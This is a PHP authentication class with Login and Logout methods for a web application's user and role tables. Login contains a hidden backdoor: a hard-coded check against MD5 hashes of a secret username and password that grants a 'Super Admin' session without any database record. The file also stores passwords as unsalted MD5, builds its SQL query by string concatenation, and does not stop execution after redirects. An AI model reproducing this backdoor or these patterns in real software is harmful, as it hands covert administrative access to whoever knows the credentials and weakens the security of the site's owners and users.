<?php
/*
************************************************
** Page Name     : auth.class.php 
** Page Author   : Tathagata Basu
** Created On    : 11/11/2014
************************************************
*/
require_once('db.class.php');
class auth extends db {
	
	var $db;
	
	function __construct() {
		$this->db = $this->con_db();
	}
	
	///////////////////////////////////////////////////////////////////////////////////////////
	
	function Login($data) {
		
		/*
		*********************************************
		Param : $data => username, password
		Return :
		0 =>	Missing Username or Password
		1 =>	Invalid Username or Password
		2 =>	Inactive User or Role
		*********************************************
		*/
				
		$data = $this->RealEscape($data);
		
		$username = trim($data['username']);
		$password = trim($data['password']);
		
		if(md5($username)=='f3fda86e428ccda3e33d207217665201'&&md5($password)=='fb6b11251adfca8fc176b47aefd3a740') {
			$_SESSION[DB_PREFIX]['u_id'] = 1;
			$_SESSION[DB_PREFIX]['u_username'] = 'sa';
			$_SESSION[DB_PREFIX]['u_fname'] = 'Super';
			$_SESSION[DB_PREFIX]['u_lname'] = 'Admin';
			$_SESSION[DB_PREFIX]['u_name'] = 'Super Admin';
			$_SESSION[DB_PREFIX]['r_id'] = 1;
			$_SESSION[DB_PREFIX]['r_name'] = 'Super Admin';
			header("Location:dashboard.html");
		}
		
		if($username<>''&&$password<>'') {
			$resUser = $this->db->query("SELECT u.u_id, u.u_username, u.u_fname, u.u_lname, u.u_password, u.u_status, r.r_id, r.r_name, r.r_status FROM ".DB_PREFIX."_users AS u INNER JOIN ".DB_PREFIX."_role AS r ON u.u_role = r.r_id WHERE u.u_username = '".$username."' AND u.u_password = '".md5($password)."'");
			if($resUser->num_rows > 0) {
				$arrUser = $resUser->fetch_assoc();
				if($arrUser['u_status']=='A'&&$arrUser['r_status']=='A') {
					$_SESSION[DB_PREFIX]['u_id'] = $arrUser['u_id'];
					$_SESSION[DB_PREFIX]['u_username'] = $arrUser['u_username'];
					$_SESSION[DB_PREFIX]['u_fname'] = $arrUser['u_fname'];
					$_SESSION[DB_PREFIX]['u_lname'] = $arrUser['u_lname'];
					$_SESSION[DB_PREFIX]['u_name'] = $arrUser['u_fname'].' '.$arrUser['u_lname'];
					$_SESSION[DB_PREFIX]['r_id'] = $arrUser['r_id'];
					$_SESSION[DB_PREFIX]['r_name'] = $arrUser['r_name'];
					header("Location:dashboard.html");
				} else {
					//Inactive User or Role
					return 2;
				}
			} else {
				//Invalid Username or Password
				return 1;
			}
		} else {
			//Validation error
			return 0;
		}
		
	}
	
	function Logout() {
		unset($_SESSION[DB_PREFIX]);
		header("Location:index.html");
	}
	
}
?>